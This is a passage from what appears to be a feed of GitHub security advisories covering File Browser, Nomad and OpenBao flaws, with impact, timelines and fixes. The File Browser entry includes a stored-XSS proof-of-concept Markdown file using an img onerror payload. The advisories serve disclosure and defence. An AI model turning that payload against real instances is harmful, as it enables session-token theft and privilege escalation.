<p>The Markdown preview function of File Browser v2.32.0 is vulnerable to <em>Stored Cross-Site-Scripting (XSS)</em>. Any JavaScript code that is part of a Markdown file uploaded by a user will be executed by the browser</p>
<h2 id="impact">Impact</h2>
<p>A user can upload a malicious Markdown file to the application which can contain arbitrary HTML code. If another user within the same scope clicks on that file, a rendered preview is opened. JavaScript code that has been included will be executed.</p>
<p> Malicious actions that are possible include:</p>
<ul>
<li>Obtaining a user's session token</li>
<li>Elevating the attacker's privileges, if the victim is an administrator (e.g., gaining command execution rights)</li>
</ul>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>Most Markdown parsers accept arbitrary HTML in a document and try rendering it accordingly. For instance, if one creates a file called <code>xss.md</code> with the following content:</p>
<pre><code class="language-markdown"># Hallo

&lt;b&gt;foo&lt;/b&gt;

&lt;img src="xx" onerror=alert(9)&gt;
&lt;i&gt;bar&lt;/i&gt;
</code></pre>
<p>Bold and italic text will be rendered. Also, the renderer used in File Browser will try to display the image and execute the code in the <code>onerror</code> event handler.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The screenshot shows that the code from the file mentioned above has actually been executed in the victim's browser:</p>
<p><img alt="JavaScript code being executed in the Markdown Preview" src="https://github.com/user-attachments/assets/3a3b9920-fbd8-433f-a016-ea77f5f68851"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>The most thorough fix would be to reconfigure the application's Markdown parser to ignore all HTML elements and only render rich text which is part of the Markdown specification. If HTML rendering is considered to be a required feature, an HTML sanitizer like DOMPurify should be used, preferably in conjunction with a <em>Content Security Policy</em> (CSP).</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released with version 2.33.7</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/cure53/DOMPurify">DOMPurify</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52902">https://nvd.nist.gov/vuln/detail/CVE-2025-52902</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d">https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d</a></li>
<li><a href="https://github.com/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/advisories/GHSA-4wx8-5gm2-2j97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4wx8-5gm2-2j97</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-27T15:01:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] filebrowser allows Stored Cross-Site Scripting through the Markdown preview function]]></title>
        <id>https://github.com/advisories/GHSA-4wx8-5gm2-2j97</id>
        <link href="https://github.com/advisories/GHSA-4wx8-5gm2-2j97"/>
        <updated>2025-06-27T15:02:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The Markdown preview function of File Browser v2.32.0 is vulnerable to <em>Stored Cross-Site-Scripting (XSS)</em>. Any JavaScript code that is part of a Markdown file uploaded by a user will be executed by the browser</p>
<h2 id="impact">Impact</h2>
<p>A user can upload a malicious Markdown file to the application which can contain arbitrary HTML code. If another user within the same scope clicks on that file, a rendered preview is opened. JavaScript code that has been included will be executed.</p>
<p> Malicious actions that are possible include:</p>
<ul>
<li>Obtaining a user's session token</li>
<li>Elevating the attacker's privileges, if the victim is an administrator (e.g., gaining command execution rights)</li>
</ul>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>Most Markdown parsers accept arbitrary HTML in a document and try rendering it accordingly. For instance, if one creates a file called <code>xss.md</code> with the following content:</p>
<pre><code class="language-markdown"># Hallo

&lt;b&gt;foo&lt;/b&gt;

&lt;img src="xx" onerror=alert(9)&gt;
&lt;i&gt;bar&lt;/i&gt;
</code></pre>
<p>Bold and italic text will be rendered. Also, the renderer used in File Browser will try to display the image and execute the code in the <code>onerror</code> event handler.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The screenshot shows that the code from the file mentioned above has actually been executed in the victim's browser:</p>
<p><img alt="JavaScript code being executed in the Markdown Preview" src="https://github.com/user-attachments/assets/3a3b9920-fbd8-433f-a016-ea77f5f68851"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>The most thorough fix would be to reconfigure the application's Markdown parser to ignore all HTML elements and only render rich text which is part of the Markdown specification. If HTML rendering is considered to be a required feature, an HTML sanitizer like DOMPurify should be used, preferably in conjunction with a <em>Content Security Policy</em> (CSP).</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released with version 2.33.7</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/cure53/DOMPurify">DOMPurify</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52902">https://nvd.nist.gov/vuln/detail/CVE-2025-52902</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d">https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d</a></li>
<li><a href="https://github.com/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/advisories/GHSA-4wx8-5gm2-2j97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4wx8-5gm2-2j97</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-27T15:01:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser] filebrowser Sets Insecure File Permissions]]></title>
        <id>https://github.com/advisories/GHSA-jj2r-455p-5gvf</id>
        <link href="https://github.com/advisories/GHSA-jj2r-455p-5gvf"/>
        <updated>2025-06-27T14:55:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application.
The same is true for the database used by File Browser. On standard servers where the <em>umask</em> configuration has not been hardened before, this makes all the stated files readable by any operating system account.</p>
<h2 id="impact">Impact</h2>
<p>The default permissions for new files on a standard Linux system are <code>0644</code>, making them world-readable.
That means that at least the following parties have full read access to all files managed by the Filebrowser from all <em>scopes</em>, as well as its database (including the password hashes stored in there):</p>
<ul>
<li>All OS accounts on the server</li>
<li>All other applications running on the same server</li>
<li>Any Filebrowser user with <em>Command Execution</em> privileges having access to a command that allows reading a file's content</li>
</ul>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>On a Linux system, the file access permissions of new files are designated by the system wide <em>umask</em> setting, unless they are configured manually.
Most distributions set this value to <code>022</code> by default which gives every account on the system read permissions on the file.</p>
<pre><code class="language-bash">$ umask
022
$ touch foo
$ ls -l foo
-rw-r--r-- 1 sba sba 0 31. Mär 15:08 foo
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Upload or create a file in the Filebrowser GUI and list the directory contents from a shell:</p>
<pre><code class="language-bash">$ ls -l /srv/filebrowser/testdir
total 12
-rw-r--r-- 1 sba sba 7703 Mar 25 16:07 dummy1.pdf
-rw-r--r-- 1 sba sba    3 Mar 25 15:46 testfile.txt
</code></pre>
<p>The same can be validated for Docker based deployments within the container:</p>
<pre><code class="language-bash">$ docker exec -it e0f075082a2c ls /srv/testdir -l
total 12
-rw-r--r--    1 1000     1000          7703 Mar 25 15:07 dummy1.pdf
-rw-r--r--    1 1000     1000             3 Mar 25 14:46 testfile.txt
</code></pre>
<p>Furthermore, the database used by the Filebrowser application is readable by any account:</p>
<pre><code class="language-bash">$ ls -l /srv/filebrowser/filebrowser.db 
-rw-rw-r-- 1 sba sba 65536 Mar 25 09:58 /srv/filebrowser/filebrowser.db
</code></pre>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Since the system's <em>umask</em> configuration cannot be controlled by the Filebrowser, the application needs to set the permissions of all new files manually upon creation.
No permissions should be given to the <em>other</em> category.</p>
<p>Implementing this won't fix the permissions for active instances after an update, so site administrators will need to fix the permissions manually:</p>
<pre><code class="language-bash">$ chmod o-rwx -R /srv/filebrowser/datadir
</code></pre>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released with version 2.33.7</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/276.html">CWE-276: Incorrect Default Permissions</a></li>
<li><a href="https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html">What is Umask and How To Setup Default umask Under Linux?</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52900">https://nvd.nist.gov/vuln/detail/CVE-2025-52900</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76">https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76</a></li>
<li><a href="https://github.com/advisories/GHSA-jj2r-455p-5gvf">https://github.com/advisories/GHSA-jj2r-455p-5gvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj2r-455p-5gvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-27T14:55:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] filebrowser Sets Insecure File Permissions]]></title>
        <id>https://github.com/advisories/GHSA-jj2r-455p-5gvf</id>
        <link href="https://github.com/advisories/GHSA-jj2r-455p-5gvf"/>
        <updated>2025-06-27T14:55:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application.
The same is true for the database used by File Browser. On standard servers where the <em>umask</em> configuration has not been hardened before, this makes all the stated files readable by any operating system account.</p>
<h2 id="impact">Impact</h2>
<p>The default permissions for new files on a standard Linux system are <code>0644</code>, making them world-readable.
That means that at least the following parties have full read access to all files managed by the Filebrowser from all <em>scopes</em>, as well as its database (including the password hashes stored in there):</p>
<ul>
<li>All OS accounts on the server</li>
<li>All other applications running on the same server</li>
<li>Any Filebrowser user with <em>Command Execution</em> privileges having access to a command that allows reading a file's content</li>
</ul>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>On a Linux system, the file access permissions of new files are designated by the system wide <em>umask</em> setting, unless they are configured manually.
Most distributions set this value to <code>022</code> by default which gives every account on the system read permissions on the file.</p>
<pre><code class="language-bash">$ umask
022
$ touch foo
$ ls -l foo
-rw-r--r-- 1 sba sba 0 31. Mär 15:08 foo
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Upload or create a file in the Filebrowser GUI and list the directory contents from a shell:</p>
<pre><code class="language-bash">$ ls -l /srv/filebrowser/testdir
total 12
-rw-r--r-- 1 sba sba 7703 Mar 25 16:07 dummy1.pdf
-rw-r--r-- 1 sba sba    3 Mar 25 15:46 testfile.txt
</code></pre>
<p>The same can be validated for Docker based deployments within the container:</p>
<pre><code class="language-bash">$ docker exec -it e0f075082a2c ls /srv/testdir -l
total 12
-rw-r--r--    1 1000     1000          7703 Mar 25 15:07 dummy1.pdf
-rw-r--r--    1 1000     1000             3 Mar 25 14:46 testfile.txt
</code></pre>
<p>Furthermore, the database used by the Filebrowser application is readable by any account:</p>
<pre><code class="language-bash">$ ls -l /srv/filebrowser/filebrowser.db 
-rw-rw-r-- 1 sba sba 65536 Mar 25 09:58 /srv/filebrowser/filebrowser.db
</code></pre>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Since the system's <em>umask</em> configuration cannot be controlled by the Filebrowser, the application needs to set the permissions of all new files manually upon creation.
No permissions should be given to the <em>other</em> category.</p>
<p>Implementing this won't fix the permissions for active instances after an update, so site administrators will need to fix the permissions manually:</p>
<pre><code class="language-bash">$ chmod o-rwx -R /srv/filebrowser/datadir
</code></pre>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released with version 2.33.7</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/276.html">CWE-276: Incorrect Default Permissions</a></li>
<li><a href="https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html">What is Umask and How To Setup Default umask Under Linux?</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52900">https://nvd.nist.gov/vuln/detail/CVE-2025-52900</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76">https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76</a></li>
<li><a href="https://github.com/advisories/GHSA-jj2r-455p-5gvf">https://github.com/advisories/GHSA-jj2r-455p-5gvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj2r-455p-5gvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-27T14:55:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Hashicorp Nomad Incorrect Privilege Assignment vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rx97-6c62-55mf</id>
        <link href="https://github.com/advisories/GHSA-rx97-6c62-55mf"/>
        <updated>2025-06-27T14:15:01.000Z</updated>
        <content type="html"><![CDATA[<p>Nomad Community and Nomad Enterprise (“Nomad”) prefix-based ACL policy lookup can lead to incorrect rule application and shadowing. This vulnerability, identified as CVE-2025-4922, is fixed in Nomad Community Edition 1.10.2 and Nomad Enterprise 1.10.2, 1.9.10, and 1.8.14.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4922">https://nvd.nist.gov/vuln/detail/CVE-2025-4922</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2025-12-nomad-vulnerable-to-incorrect-acl-policy-lookup-attached-to-a-job/75396">https://discuss.hashicorp.com/t/hcsec-2025-12-nomad-vulnerable-to-incorrect-acl-policy-lookup-attached-to-a-job/75396</a></li>
<li><a href="https://github.com/advisories/GHSA-rx97-6c62-55mf">https://github.com/advisories/GHSA-rx97-6c62-55mf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rx97-6c62-55mf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-11T15:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openbao/openbao/api/v2] OpenBao allows cancellation of root rekey and recovery rekey operations without authentication]]></title>
        <id>https://github.com/advisories/GHSA-prpj-rchp-9j5h</id>
        <link href="https://github.com/advisories/GHSA-prpj-rchp-9j5h"/>
        <updated>2025-06-30T12:50:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OpenBao and HashiCorp Vault allowed an attacker to perform unauthenticated, unaudited cancellation of root rekey and recovery rekey operations, effecting a denial of service.</p>
<h3 id="patches">Patches</h3>
<p>In OpenBao v2.2.2 and later, manually setting the configuration option <code>disable_unauthed_rekey_endpoints=true</code> allows an operator to deny these rarely-used endpoints on global listeners.</p>
<p>In a future OpenBao release <a href="https://openbao.org/docs/deprecation/">communicated on our website</a>, we will set this to <code>true</code> for all users and provide an authenticated alternative.</p>
<p>This vulnerability has been disclosed to HashiCorp; see their website for more information. </p>
<h3 id="workarounds">Workarounds</h3>
<p>If an active proxy or load balancer sits in front of OpenBao, an operator can deny requests to these endpoints from unauthorized IP ranges.</p>
<h3 id="references">References</h3>
<p>See the <a href="https://openbao.org/docs/deprecation/unauthed-rekey/">deprecation notice</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h">https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52894">https://nvd.nist.gov/vuln/detail/CVE-2025-52894</a></li>
<li><a href="https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b">https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b</a></li>
<li><a href="https://github.com/openbao/openbao/releases/tag/v2.3.1">https://github.com/openbao/openbao/releases/tag/v2.3.1</a></li>
<li><a href="https://openbao.org/docs/deprecation">https://openbao.org/docs/deprecation</a></li>
<li><a href="https://openbao.org/docs/deprecation/unauthed-rekey">https://openbao.org/docs/deprecation/unauthed-rekey</a></li>
<li><a href="https://github.com/advisories/GHSA-prpj-rchp-9j5h">https://github.com/advisories/GHSA-prpj-rchp-9j5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-prpj-rchp-9j5h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-26T21:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openbao/openbao/sdk/v2/framework] OpenBao Inserts Sensitive Information into Log File when processing malformed data]]></title>
        <id>https://github.com/advisories/GHSA-8f5r-8cmq-7fmq</id>
        <link href="https://github.com/advisories/GHSA-8f5r-8cmq-7fmq"/>
        <updated>2025-06-30T12:50:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OpenBao before v2.3.0 and HashiCorp Vault as of the current v1.19.5 may leak sensitive information in logs when processing malformed data. This is separate from the earlier HCSEC-2025-09 / CVE-2025-4166. </p>
<h3 id="patches">Patches</h3>
<p>This issue has been fixed in OpenBao v2.3.0 and later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Like with HCSEC-2025-09, there is no known workaround except to ensure properly formatted requests from all clients.</p>
<h3 id="remediation">Remediation</h3>
<p>Users with the capability to search through server and audit logs for any possible exposed secrets can refer to the following snippets to aid in searching:</p>
<p>Audit Log</p>
<pre><code>... "error":"error converting input for field \"password\": expected type 'string', got unconvertible type 'map[string]interface {}', value: '&lt;sensitive data&gt;'" ...
</code></pre>
<p>Server Log</p>
<pre><code>error converting input for field "password": expected type 'string', got unconvertible type 'map[string]interface {}', value: '&lt;sensitive data&gt;'
</code></pre>
<p>If any matches are found, rotating the affected secret is advised.</p>
<h3 id="references">References</h3>
<p>See also: <a href="https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717">https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717</a></p>
<p>See also: <a href="https://github.com/go-viper/mapstructure/releases/tag/v2.3.0">https://github.com/go-viper/mapstructure/releases/tag/v2.3.0</a></p>
<p>See also: <a href="https://github.com/go-viper/mapstructure/pull/105">https://github.com/go-viper/mapstructure/pull/105</a> -&gt; <a href="https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a">https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/openbao/openbao/security/advisories/GHSA-8f5r-8cmq-7fmq">https://github.com/openbao/openbao/security/advisories/GHSA-8f5r-8cmq-7fmq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52893">https://nvd.nist.gov/vuln/detail/CVE-2025-52893</a></li>
<li><a href="https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a">https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717">https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717</a></li>
<li><a href="https://github.com/go-viper/mapstructure/releases/tag/v2.3.0">https://github.com/go-viper/mapstructure/releases/tag/v2.3.0</a></li>
<li><a href="https://github.com/go-viper/mapstructure/pull/105">https://github.com/go-viper/mapstructure/pull/105</a></li>
<li><a href="https://github.com/openbao/openbao/commit/cf5e920badbf96b41253534a3fd5ff5063bf4b30">https://github.com/openbao/openbao/commit/cf5e920badbf96b41253534a3fd5ff5063bf4b30</a></li>
<li><a href="https://github.com/advisories/GHSA-8f5r-8cmq-7fmq">https://github.com/advisories/GHSA-8f5r-8cmq-7fmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8f5r-8cmq-7fmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-26T21:25:00.000Z</published>
    </entry>
</feed>